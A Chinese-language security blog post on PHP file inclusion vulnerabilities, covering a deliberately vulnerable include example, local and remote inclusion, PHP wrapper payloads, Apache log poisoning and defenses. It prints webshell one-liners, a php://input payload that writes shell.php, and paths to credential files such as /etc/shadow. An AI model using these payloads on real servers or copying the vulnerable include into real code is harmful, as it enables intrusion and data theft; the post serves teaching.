@@ -1,0 +1,360 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>文件包含漏洞 | Sre.Night's blog</title><meta name="author" content="Sre.Night"><meta name="copyright" content="Sre.Night"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#F5F9FF"><meta name="description" content="文件包含漏洞一、案例test.php: &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&amp;quot">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞">
+<meta property="og:url" content="https://sre-night.github.io/2025/04/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Sre.Night&#39;s blog">
+<meta property="og:description" content="文件包含漏洞一、案例test.php: &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&amp;quot">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sre-night.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-04-13T08:04:10.000Z">
+<meta property="article:modified_time" content="2025-07-03T09:37:51.341Z">
+<meta property="article:author" content="Sre.Night">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sre-night.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "文件包含漏洞",
+  "url": "https://sre-night.github.io/2025/04/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/",
+  "image": "https://sre-night.github.io/img/butterfly-icon.png",
+  "datePublished": "2025-04-13T08:04:10.000Z",
+  "dateModified": "2025-07-03T09:37:51.341Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Sre.Night",
+      "url": "https://sre-night.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://sre-night.github.io/2025/04/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0A1A35')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#F5F9FF')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '文件包含漏洞',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/loading.css"><link rel="stylesheet" href="/css/nav.css"><link rel="stylesheet" href="/css/footer.css"><link rel="stylesheet" href="/css/fonts/font.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-categories-card@1.0.0/lib/categorybar.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/xlenco/JS-X@main/pace.js/pace.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/default_top_img.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Sre.Night's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">文件包含漏洞</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">文件包含漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-13T08:04:10.000Z" title="发表于 2025-04-13 16:04:10">2025-04-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-03T09:37:51.341Z" title="更新于 2025-07-03 17:37:51">2025-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h3 id="一、案例"><a href="#一、案例" class="headerlink" title="一、案例"></a>一、案例</h3><p><code>test.php</code>:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;文件包含案例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;&lt;a href=<span class="string">&quot;test.php&quot;</span>&gt;Ryan&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;./test.php?file=about.php&quot;</span>&gt;About Me&lt;/a&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p><code>about.php</code>:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is about page!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I am Ryan.&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Thank you!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag in flag.txt&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="二、文件包含漏洞"><a href="#二、文件包含漏洞" class="headerlink" title="二、文件包含漏洞"></a>二、文件包含漏洞</h3><h4 id="1-文件包含"><a href="#1-文件包含" class="headerlink" title="1. 文件包含"></a>1. 文件包含</h4><p>文件包含：开发人员将可重复使用的内容写到单个文件中，使用时直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。这样编写代码能减少代码冗余，降低代码后期维护难度，保证网站整体风格统一，比如：导航栏、底部栏等。</p>
+<h4 id="2-文件包含漏洞"><a href="#2-文件包含漏洞" class="headerlink" title="2. 文件包含漏洞"></a>2. 文件包含漏洞</h4><p>文件包含漏洞：开发人员希望代码更加灵活，有时会将包含的文件设置为变量，用来动态调用，由于这种灵活性，可能导致攻击者调用恶意文件，造成文件包含漏洞。</p>
+<h4 id="3-漏洞危害"><a href="#3-漏洞危害" class="headerlink" title="3. 漏洞危害"></a>3. 漏洞危害</h4><ol>
+<li>配合文件上传漏洞GetShell</li>
+<li>网站源码文件以及配置文件泄露</li>
+<li>远程包含GetShell</li>
+<li>敏感信息泄露</li>
+</ol>
+<h4 id="4-文件包含相关函数"><a href="#4-文件包含相关函数" class="headerlink" title="4. 文件包含相关函数"></a>4. 文件包含相关函数</h4><p>几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web应用中居多，而在JSP、ASP程序中却非常少，甚至没有。PHP中提供了四个文件包含的函数，分别是<code>include()</code>、<code>include_once()</code>、<code>require()</code>和<code>require_once()</code>。它们的特点为：</p>
+<ul>
+<li><code>include</code>：出现错误时，会抛出一个警告，程序继续运行。</li>
+<li><code>include_once</code>：出现错误时，会抛出警告，且仅包含一次。</li>
+<li><code>require</code>：出现错误时，会直接报错并退出程序执行。</li>
+<li><code>require_once</code>：出错时直接退出；且仅包含一次。</li>
+</ul>
+<p>PHP文件包含的特性：<br>只要被包含文件的文件内容符合PHP语法，不管文件类型是什么，该文件都会被php解释器去解析执行；如果文件内容不符合PHP语法，就会将该文件内容读取出来。</p>
+<h4 id="5-漏洞利用思路"><a href="#5-漏洞利用思路" class="headerlink" title="5. 漏洞利用思路"></a>5. 漏洞利用思路</h4><ol>
+<li>包含一些敏感的配置文件，获取目标敏感信息</li>
+<li>配合图片马getshell</li>
+<li>包含临时文件getshell</li>
+<li>包含session文件getshell</li>
+<li>包含日志文件getshell(Apache等)</li>
+<li>利用php伪协议进行攻击</li>
+</ol>
+<h3 id="三、文件包含漏洞类型"><a href="#三、文件包含漏洞类型" class="headerlink" title="三、文件包含漏洞类型"></a>三、文件包含漏洞类型</h3><h4 id="1-本地文件包含"><a href="#1-本地文件包含" class="headerlink" title="1. 本地文件包含"></a>1. 本地文件包含</h4><p>概念：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合网站的文件上传功能，从而形成更大的威力。简单来说：当包含的文件在服务器本地时，就形成了本地文件包含。</p>
+<h5 id="（1）利用方式"><a href="#（1）利用方式" class="headerlink" title="（1）利用方式"></a>（1）利用方式</h5><ol>
+<li>上传图片马，包含图片马GetShell</li>
+<li>读取网站源码以及配置文件</li>
+<li>包含日志文件GetShell</li>
+</ol>
+<h5 id="（2）读取敏感信息"><a href="#（2）读取敏感信息" class="headerlink" title="（2）读取敏感信息"></a>（2）读取敏感信息</h5><p>利用格式：<br>利用<code>file://</code>伪协议读取<br>Windows常见敏感文件：</p>
+<ul>
+<li><code>http://example.com/file.php?file=flag.txt</code></li>
+<li><code>http://example.com/file.php?file=file://c:/windows/win.ini</code><table>
+<thead>
+<tr>
+<th>文件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>C:\boot.ini</code></td>
+<td>查看系统版本</td>
+</tr>
+<tr>
+<td><code>C:\windows\system32\inetsrv\MetaBase.xml</code></td>
+<td>iis配置文件</td>
+</tr>
+<tr>
+<td><code>C:\windows\repair\sam</code></td>
+<td>存储windows系统初次安装密码</td>
+</tr>
+<tr>
+<td><code>C:\ProgramFiles\mysql\my.ini</code></td>
+<td>mysql配置信息</td>
+</tr>
+<tr>
+<td><code>C:\ProgramFiles\mysql\data\mysql.user.MYD</code></td>
+<td>mysql root密码</td>
+</tr>
+<tr>
+<td><code>C:\windows\win.ini</code></td>
+<td>系统信息，常用于注入木马</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<p>Linux常见敏感文件：</p>
+<ul>
+<li><code>/etc/passwd</code>|账户信息</li>
+<li><code>/etc/shadow</code>|账户密码文件</li>
+<li><code>/etc/apache2/apache2.conf</code>|Apache2默认配置文件</li>
+<li><code>/etc/my.cnf</code>|mysql配置文件</li>
+<li><code>/etc/php/5.6/apache2/php.ini</code>|php相关配置</li>
+<li><code>/etc/httpd/conf/httpd.conf</code>|apache配置信息</li>
+</ul>
+<h4 id="2-远程文件包含"><a href="#2-远程文件包含" class="headerlink" title="2. 远程文件包含"></a>2. 远程文件包含</h4><p>概念：如果应用程序的配置还允许包含远程的其它服务器上的文件，恶意攻击者就有可能构造恶意的脚本然后通过包含并予以执行，进而获取WEB应用的敏感数据或控制权，这种方式称为远程文件包含。简单来说：当包含的文件在远程服务器上时，就形成了远程文件包含。</p>
+<p>利用前提：<code>allow_url_fopen=On</code>（默认开启）并且<code>allow_url_include=On</code>（默认关闭），可在<code>\phpstudy\PHPTutorial\php\php-5.2.17\php.ini</code>中配置。</p>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>攻击者在自己的服务器上随意写一个文件<code>phpinfo.php</code>，内容为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后在目标网站上包含该文件。<br>远程文件包含一句话木马时，不要做成<code>.php</code>文件，一般做成<code>.txt</code>文件。因为本地php解释器和远程服务器的php解释器可能会造成冲突从而导致不解析。并且后缀为<code>.php</code>的文件，在包含时，显示的是远程服务器的信息，而不是本地的信息。如上方<code>phpinfo.php</code>显示的是远程服务器(kali)的php信息。<br>所以我们在远程服务器(kali)的<code>/var/www/html</code>目录下，创建一个名为<code>shell.txt</code>的文件，文件内容为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后通过远程文件包含来包含该文件（记得开启kali的apache服务）。</p>
+<h3 id="四、PHP伪协议"><a href="#四、PHP伪协议" class="headerlink" title="四、PHP伪协议"></a>四、PHP伪协议</h3><p>PHP带有很多内置URL风格的封装协议，用于类似<code>fopen()</code>、<code>copy()</code>、<code>file_exists()</code>和<code>filesize()</code>文件系统函数。具体协议请参照<a target="_blank" rel="noopener" href="http://www.php.net/manual/zh/wrappers.php">PHP官方文档</a>。</p>
+<h4 id="1-file"><a href="#1-file" class="headerlink" title="1. file:&#x2F;&#x2F;"></a>1. file:&#x2F;&#x2F;</h4><ul>
+<li><strong>作用</strong>：用于访问本地文件系统，常用来读取本地文件。</li>
+<li><strong>使用方法</strong>：<code>file://</code>文件的绝对路径和文件名。</li>
+<li><strong>示例</strong>：<ul>
+<li>绝对路径：<code>http://127.0.0.1/include.php?file=file://c:/windows/win.ini</code></li>
+<li>相对路径：<code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="2-php-input"><a href="#2-php-input" class="headerlink" title="2. php:&#x2F;&#x2F;input"></a>2. php:&#x2F;&#x2F;input</h4><p><code>php://input</code>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行，如果存在文件包含漏洞，可将<code>php://input</code>作为文件名传入，同时在post中设置想要注入的代码，php执行时就会将post的内容作为php代码执行。</p>
+<ul>
+<li><strong>前提条件</strong>：<ul>
+<li><code>allow_url_fopen</code>：off&#x2F;on</li>
+<li><code>allow_url_include</code>：on</li>
+</ul>
+</li>
+<li><strong>形式</strong>：<ul>
+<li><code>php://input</code></li>
+<li><code>post:php代码</code></li>
+</ul>
+</li>
+<li><strong>示例</strong>：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;])?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="3-php-filter"><a href="#3-php-filter" class="headerlink" title="3. php:&#x2F;&#x2F;filter"></a>3. php:&#x2F;&#x2F;filter</h4><p><code>php://filter</code>是一种元封装器，设计用于数据流打开时的筛选过滤。主要用来查看源码。</p>
+<ul>
+<li><strong>用法</strong>：<code>php://filter/read=convert.base64_encode/resource=filepath</code>，表示以base64编码的方式进行读取指定路径的文件。</li>
+<li><strong>示例</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/03Web17/include/test.php?file=php://filter/read=convert.base64_encode/resource=about.php</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="4-phar"><a href="#4-phar" class="headerlink" title="4. phar:&#x2F;&#x2F;"></a>4. phar:&#x2F;&#x2F;</h4><ul>
+<li><strong>作用</strong>：属于压缩流，可以访问压缩文件中的子文件，不需要指定后缀名，可修改为任意后缀，比如：<code>jpg</code>、<code>png</code>、<code>gif</code>等。</li>
+<li><strong>使用方法</strong>：可以使用相对路径也可以使用绝对路径。</li>
+<li><strong>示例</strong>：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">phar:<span class="comment">//./phpinfo.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="5-zip"><a href="#5-zip" class="headerlink" title="5. zip:&#x2F;&#x2F;"></a>5. zip:&#x2F;&#x2F;</h4><ul>
+<li><strong>作用</strong>：属于压缩流，可以访问压缩文件中的子文件，可以不需要指定后缀名，可修改为任意后缀。比如：<code>jpg</code>、<code>png</code>、<code>gif</code>等。</li>
+<li><strong>优缺点</strong>：<ul>
+<li><strong>优点</strong>：可以绕过包含的固定后缀。</li>
+<li><strong>缺点</strong>：需要知道文件的绝对路径。</li>
+</ul>
+</li>
+<li><strong>示例</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</span><br><span class="line">http://127.0.0.1/03Web17/include/test.php?file=phar://./phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="6-http-https"><a href="#6-http-https" class="headerlink" title="6. http:&#x2F;&#x2F; https:&#x2F;&#x2F;"></a>6. http:&#x2F;&#x2F; https:&#x2F;&#x2F;</h4><ul>
+<li><strong>作用</strong>：访问远程文件或资源，常用于远程包含。</li>
+<li><strong>示例</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/03Web17/include/test.php?file=zip://D:/phpStudy/PHPTutorial/WWW/03Web17/include/phpinfo.jpg%23phpinfo.txt</span><br><span class="line">allow_url_fopen：on</span><br><span class="line">allow_url_include: on</span><br><span class="line">http://127.0.0.1/03Web17/include/test.php?file=http://baidu.com/robots.txt</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="7-data"><a href="#7-data" class="headerlink" title="7. data:&#x2F;&#x2F;"></a>7. data:&#x2F;&#x2F;</h4><ul>
+<li><strong>作用</strong>：数据流封装器，以传递相应格式的数据。</li>
+<li><strong>使用条件</strong>：<ul>
+<li><code>allow_url_fopen</code>：on</li>
+<li><code>allow_url_include</code>：on</li>
+</ul>
+</li>
+<li><strong>用法</strong>：<ul>
+<li><code>data://text/plain,[php代码]</code></li>
+<li><code>data://text/plain;base64,[base64编码的php代码]</code></li>
+</ul>
+</li>
+<li><strong>示例</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="五、防御方案"><a href="#五、防御方案" class="headerlink" title="五、防御方案"></a>五、防御方案</h3><ol>
+<li><strong>设置白名单</strong>：代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。</li>
+<li><strong>路径限制</strong>：限制被包含的文件只能在某一文件夹内，PHP配置文件中有<code>open_basedir</code>选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。</li>
+<li><strong>关闭危险配置</strong>：PHP配置中的<code>allow_url_include</code>选项如果打开，PHP会通过Include&#x2F;Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。</li>
+<li><strong>过滤危险字符</strong>：严格检查用户输入，参数中不允许出现<code>../</code>之类的目录跳转符。</li>
+<li><strong>尽量不要使用动态包含</strong>：可以在需要包含的页面固定写好，如：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;head.php&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="六、包含Apache日志文件-getshell"><a href="#六、包含Apache日志文件-getshell" class="headerlink" title="六、包含Apache日志文件 getshell"></a>六、包含Apache日志文件 getshell</h3><ul>
+<li><strong>开启Apache日志文件</strong><ul>
+<li>一般apache会存在两个日志文件：<ol>
+<li>访问日志文件（<code>access.log</code>）访问日志默认是不开启</li>
+<li>错误日志文件（<code>error.log</code>）</li>
+</ol>
+</li>
+<li>apache开启了日志功能时，会主动记录外部访问到<code>access.log</code></li>
+</ul>
+</li>
+<li><strong>访问网站</strong>：在网址中输入一句话木马<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code></li>
+<li><strong>查看<code>access.log</code>文件</strong>：发现部分内容被转义了</li>
+<li><strong>使用burp发包</strong></li>
+<li><strong>再次查看<code>access.log</code>文件</strong>：发现一句话木马正常存在</li>
+<li><strong>包含<code>access.log</code>文件getshell</strong></li>
+</ul>
+<h3 id="七、phpmyadmin-文件包含"><a href="#七、phpmyadmin-文件包含" class="headerlink" title="七、phpmyadmin 文件包含"></a>七、phpmyadmin 文件包含</h3><h3 id="1-利用-session-文件-getshell"><a href="#1-利用-session-文件-getshell" class="headerlink" title="1. 利用 session 文件 getshell"></a>1. 利用 session 文件 getshell</h3><ol>
